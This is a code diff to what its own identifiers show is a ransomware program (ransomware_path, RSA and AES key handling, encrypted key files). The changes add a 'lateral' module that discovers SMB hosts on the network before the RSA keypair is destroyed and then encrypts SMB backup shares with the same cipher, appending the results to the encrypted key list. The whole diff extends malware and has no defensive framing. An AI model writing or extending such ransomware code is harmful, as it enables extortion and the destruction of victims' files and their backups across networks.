@@ -1,6 +1,7 @@
 import variables
 import asymmetric
 import get_files
+import lateral
 import symmetric
 import environment
 import generate_keys
@@ -83,6 +84,9 @@ def menu():
     files = [f for f in get_files.find_files(variables.home)
              if not base64.b64decode(f).decode('utf-8', errors='replace').startswith(variables.ransomware_path)]
 
+    # phase 2 discovery: find SMB hosts now before RSA keypair is destroyed
+    smb_hosts = lateral.find_smb_hosts()
+
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
     
@@ -121,6 +125,10 @@ def menu():
     aes_keys_and_base64_path = None
     del aes_keys_and_base64_path
     gc.collect()
+
+    # phase 2 encrypt: SMB backup shares — same cipher, results appended inline
+    enc_aes_key_and_base64_path += lateral.encrypt_smb_shares(
+        smb_hosts, client_public_key_object_cipher)
 
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
